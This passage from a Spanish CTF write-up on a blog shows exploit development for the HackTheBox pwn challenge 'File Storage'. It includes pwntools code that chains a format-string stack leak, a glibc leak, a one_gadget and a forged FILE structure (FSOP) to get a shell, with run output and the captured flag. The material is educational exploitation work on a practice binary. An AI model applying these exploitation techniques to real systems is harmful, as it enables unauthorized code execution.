<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651498
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1651498)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651578
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1651578)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651580
[<span class="code-green">+</span>] Filename: PT.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1651580)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1651638
[<span class="code-blue">*</span>] Leaked puts() address: 0x7ffff7e5b420
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd7000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><p>Muy bien, tenemos con éxito una <em>shell</em> interactiva.</p><p>Sin embargo, aún no hemos terminado. Ahora debemos burlar ASLR para las direcciones de la pila (recordemos que lo habíamos deshabilitado temporalmente).</p><h3 id="con-aslr">Con ASLR</h3><p>Para burlar el ASLR de la pila, necesitamos filtrar una dirección de la pila en tiempo de ejecución. Esto se puede hacer utilizando la vulnerabilidad de <em>Format String</em> y calcular las direcciones para la estructura <code>FILE</code> usando <em>offsets</em>.</p><p>La fuga debe hacerse antes de filtrar la dirección de función de Glibc (porque estamos leyendo un archivo y solo podremos escribir, no leer de nuevo).</p><p>Afortunadamente, resulta que <code>%1$p</code> filtra una dirección de la pila (<code>0x7fffffffbfa0</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %1$ptxt
Error: File not found. Please try again  
Debug: /tmp/0x7fffffffbfa0tx
1. Read contents from a file
2. Write data into a random file
3. Exit
&gt;
</code></pre></div><p>Como se puede ver, necesitamos agregar <code>txt</code> para pasar la verificación del nombre de archivo.</p><p>Por lo tanto, podemos usar esta fuga para calcular el <em>offset</em> donde se colocará la estructura <code>FILE</code> falsa en la pila:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; hex(0x7fffffffe608 - 0x7fffffffbfa0)  
'0x2668'
</code></pre></div><p>Aunque esta es una buena idea, las direcciones de la pila pueden cambiar según el entorno, por lo que tendremos que agregar GDB nuevamente al proceso si necesitamos depurar el <em>exploit</em>. Este es el <em>exploit</em> utilizando la fuga de la dirección de la pila y los <em>offsets</em> (todavía sin ASLR):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env python3</span>

<span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">brute_force_filename</span><span class="mtk1">(</span><span class="mtk9 mtki">p</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span><span class="mtk9 mtki">addr</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">, </span><span class="mtk9 mtki">_lock</span><span class="mtk1">: </span><span class="mtk8 mtku">int</span><span class="mtk1">) -&gt; </span><span class="mtk8 mtku">bytes</span><span class="mtk1">:</span>
    <span class="mtk3"># ...</span>


<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">():</span>
    <span class="mtk3"># ...</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">get_process</span><span class="mtk1">()</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk7 mtki">f</span><span class="mtk4">'%1$ptxt'</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">())</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvuntil</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Debug: /tmp/'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">int</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">decode</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">(</span><span class="mtk4">'txt</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">), </span><span class="mtk6">16</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Stack leak: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">stack_leak</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'&gt; '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'1'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'Filename: '</span><span class="mtk1">, </span><span class="mtk1">filename</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(string/number): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'number'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> u64(</span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">recvline</span><span class="mtk1">().</span><span class="mtk8">strip</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">).</span><span class="mtk8">ljust</span><span class="mtk1">(</span><span class="mtk6">8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">info</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Leaked puts() address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">puts_addr</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">puts_addr</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.puts</span>
<span class="mtk1">    </span><span class="mtk1">log</span><span class="mtk1">.</span><span class="mtk8">success</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">'Glibc base address: </span><span class="mtk6">{</span><span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1">)</span><span class="mtk6">}</span><span class="mtk4">'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">288</span>
<span class="mtk1">    </span><span class="mtk1">one_gadgets</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> [</span><span class="mtk7 mtki">0x</span><span class="mtk6">e3afe</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b01</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">e3b04</span><span class="mtk1">]</span>

<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">one_gadgets</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">])</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk8">fsop</span><span class="mtk1">(</span>elf<span class="mtk1">.</span><span class="mtk1">got</span><span class="mtk1">.fclose, </span><span class="mtk1">stack_leak</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> (</span><span class="mtk1">offset</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">))</span>
<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">stack_leak</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">2668</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'(yes/no): '</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'yes'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">sendlineafter</span><span class="mtk1">(</span><span class="mtk7 mtki">b</span><span class="mtk4">'content:</span><span class="mtk6">\n</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk1">payload</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk1">p</span><span class="mtk1">.</span><span class="mtk8">interactive</span><span class="mtk1">()</span>


<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
<span class="mtk1">    </span><span class="mtk8">main</span><span class="mtk1">()</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674295
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1674295)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674317
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1674317)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674319
[<span class="code-green">+</span>] Filename: QJ.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1674319)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1674377
[<span class="code-green">+</span>] Stack leak: 0x7fffffffbf60
[<span class="code-blue">*</span>] Leaked puts() address: 0x7ffff7e5b420
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd7000
[<span class="code-blue">*</span>] Switching to interactive mode
Fatal error: glibc detected an invalid stdio handle
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>No obtenemos un <em>shell</em>, pero podemos ver que la fuga de la pila es diferente de antes, actualicemos el <em>offset</em> otra vez:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
&gt;&gt;&gt; hex(0x7fffffffe608 - 0x7fffffffbf60)  
'0x26a8'
</code></pre></div><p>Y ahora funciona de nuevo:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676781
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1676781)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676803
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1676803)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676805
[<span class="code-green">+</span>] Filename: JB.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1676805)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1676863
[<span class="code-green">+</span>] Stack leak: 0x7fffffffbe90
[<span class="code-blue">*</span>] Leaked puts() address: 0x7ffff7e5b420
[<span class="code-green">+</span>] Glibc base address: 0x7ffff7dd7000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><p>Ahora que solo dependemos de fugas y <em>offsets</em>, podemos habilitar ASLR y todo debería funcionar&mldr; pero no funciona.</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> 2 | <span class="code-dark-green mtku">sudo</span> <span class="code-dark-green">tee</span> <span class="mtku">/proc/sys/kernel/randomize_va_space</span>
[sudo] password for rocky:
2

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679645
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1679645)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679722
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1679722)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679724
[<span class="code-green">+</span>] Filename: RB.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1679724)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1679782
[<span class="code-green">+</span>] Stack leak: 0x7ffd38a35560
[<span class="code-blue">*</span>] Leaked puts() address: 0x7fba40d38420
[<span class="code-green">+</span>] Glibc base address: 0x7fba40cb4000
[<span class="code-blue">*</span>] Switching to interactive mode
[<span class="code-blue">*</span>] Got EOF while reading in interactive
<span class="code-red">$</span>
</code></pre></div><p>Echando un vistazo nuevamente a los <em>payloads</em> de FSOP, hemos puesto el valor de <code>_lock</code> <em>hard-coded</em> (<code>0x405790</code>). El valor de <code>_lock</code> solo debe ser una dirección de escritura válida, por lo que podemos usar la fuga de pila para ese propósito. Si corregimos este problema, el <em>exploit</em> funcionará correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683171
[<span class="code-blue">*</span>] Process './file_storage' stopped with exit code 0 (pid 1683171)  

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683193
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1683193)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683195
[<span class="code-green">+</span>] Filename: DK.txt
[<span class="code-blue">*</span>] Stopped process './file_storage' (pid 1683195)

[<span class="code-green">+</span>] Starting local process './file_storage': pid 1683253
[<span class="code-green">+</span>] Stack leak: 0x7fff4a9f16c0
[<span class="code-blue">*</span>] Leaked puts() address: 0x7f63178c2420
[<span class="code-green">+</span>] Glibc base address: 0x7f631783e000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>Ejecutemos el <em>exploit</em> en la instancia remota:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> 127.0.0.1:1337
[<span class="code-blue">*</span>] './file_storage'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-yellow">Partial RELRO</span>
    Stack:    <span class="code-dark-red">No canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-red">No PIE (0x3ff000)</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done  
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1337

[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1337

[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-green">+</span>] Filename: VD.txt
[<span class="code-blue">*</span>] Closed connection to 127.0.0.1 port 1337

[<span class="code-green">+</span>] Opening connection to 127.0.0.1 on port 1337: Done
[<span class="code-green">+</span>] Stack leak: 0x7ffcd7178810
[<span class="code-blue">*</span>] Leaked puts() address: 0x7fd03a2cf420
[<span class="code-green">+</span>] Glibc base address: 0x7fd03a24b000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
file_storage
flag.txt
run_challenge.sh
<span class="code-red">$</span> cat flag.txt
HTB{B0Fs_4nd_F0rm4ts_4r3_l4m3_1f_y0u_h4v3_FS0P!}
</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Challenges/Pwn/FileStorage/solve.py"><code>solve.py</code></a>.</p><h2 id="vía-no-intencionada">Vía no intencionada</h2><p>La forma prevista de obtener una fuga de memoria de Glibc era usar <code>puts</code> y <code>atoi</code>. Había una forma no deseada de filtrar Glibc usando la vulnerabilidad de <em>Format String</em>. Aunque agregué la limitación <code>txt</code> para que el <em>payload</em> fuera del tipo <code>%1$ptxt</code>, parece que <code>%12 $txt</code> también funciona porque <code>%tx</code> es un especificador de formato válido (más información en <a href="https://en.wikipedia.org/wiki/Printf_format_string#Length_field">Wikipedia</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./file_storage</span>
Welcome to my File Storage (beta):

1. Read contents from a file
2. Write data into a random file
3. Exit
&gt; 1
Filename: %10$txt
Error: File not found. Please try again  
Debug: /tmp/0
1. Read contents from a file
2. Write data into a random file
3. Exit
&gt;
</code></pre></div><p>Entonces, utilizando desde <code>%1$ptx</code> hasat <code>%9$ptx</code>, las únicas fugas útiles eran las direcciones de pila. Pero desde <code>%10$txt</code> hasta <code>%99$txt</code>, había algunas direcciones Glibc, por lo que no era necesario usar <code>atoi</code> y <code>puts</code>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#configuración-del-entorno">Configuración del entorno</a></li><li><a href="#ingeniería-inversa">Ingeniería inversa</a><ul><li><a href="#encontrando-vulnerabilidades">Encontrando vulnerabilidades</a></li></ul></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a><ul><li><a href="#fsop">FSOP</a></li></ul></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#sin-aslr">Sin ASLR</a></li><li><a href="#con-aslr">Con ASLR</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li><li><a href="#vía-no-intencionada">Vía no intencionada</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>